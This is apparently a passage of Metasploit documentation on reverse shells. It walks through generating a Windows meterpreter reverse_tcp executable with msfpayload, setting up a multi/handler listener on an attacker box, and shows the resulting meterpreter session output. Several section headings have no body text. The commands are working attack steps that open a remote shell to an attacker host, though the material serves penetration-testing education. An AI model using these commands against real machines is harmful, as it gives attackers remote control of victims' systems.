## On this page
## List of Metasploit reverse shells
To get a list of reverse shells, use the `msfpayload` command. B
```bash
./msfpayload -l |grep reverse
```

### Windows common reverse shell
### Linux common reverse shell
## When to use a reverse shell
## When a reverse shell isn't needed
## How to set up for a reverse shell during payload generation
## Demonstration
### Step 1: Generate the executable payload
On the attacker's box, run `msfpayload` or `msfvenom`:
```bash
$ ./msfpayload windows/meterpreter/reverse_tcp lhost=192.168.1.123 lport=4444 X > /tmp/iambad.exe
Created by msfpayload (http://www.metasploit.com).
Payload: windows/meterpreter/reverse_tcp
Length: 287
Options: {"LHOST"=>"192.168.1.123", "LPORT"=>"4444"}
```

### Step 2: Copy the executable payload to box B
### Step 3: Set up the payload handler on box A
Box A is the attacker machine.
```bash
$ ./msfconsole -q
msf > use exploit/multi/handler
msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(handler) > set lhost 192.168.1.123
lhost => 192.168.1.123
msf exploit(handler) > set lport 4444
lport => 4444
msf exploit(handler) > run

[*] Started reverse handler on 192.168.1.123:4444
[*] Starting the payload handler...
```

### Step 4: Double-click on the malicious executable
### Step 5: View the meterpreter/payload session on box A

```bash
$ ./msfconsole -q
msf > use exploit/multi/handler
msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(handler) > set lhost 192.168.1.123
lhost => 192.168.1.123
msf exploit(handler) > set lport 4444
lport => 4444
msf exploit(handler) > run

[*] Started reverse handler on 192.168.1.123:4444
[*] Starting the payload handler...
[*] Sending stage (770048 bytes) to 192.168.1.80
[*] Meterpreter session 1 opened (192.168.1.123:4444 -> 192.168.1.80:1138) at 2014-10-22 19:03:43 -0500
meterpreter >
```

